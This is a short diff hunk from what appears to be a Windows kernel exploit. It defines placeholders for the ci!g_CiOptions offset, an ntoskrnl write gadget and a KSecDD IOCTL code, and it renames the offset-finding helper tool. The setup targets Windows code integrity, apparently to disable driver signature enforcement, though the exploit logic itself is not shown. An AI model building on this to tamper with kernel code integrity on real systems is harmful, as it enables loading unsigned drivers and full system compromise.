@@ -5,10 +5,10 @@
 #pragma comment (lib, "ntdll")
 
 // ci!g_CiOptions
-#define CI_OPTIONS 0x // RUN swind2.exe on the target host and use the value of "Offset CiOptions" | example: 0x3A478
+#define CI_OPTIONS 0x // RUN offsets.exe on the target host and use the value of "Offset CiOptions" | example: 0x3A478
 
 // mov qword [rcx], rdx
-#define NTOSKRNL_WRITE_GADGET 0x // RUN swind2.exe on the target host and use the value of "Offset asm mov" | example: 0x201852
+#define NTOSKRNL_WRITE_GADGET 0x // RUN offsets.exe on the target host and use the value of "Offset asm mov" | example: 0x201852
 
 #define IOCTL_KSEC_IPC_SET_FUNCTION_RETURN 0x39006f
 
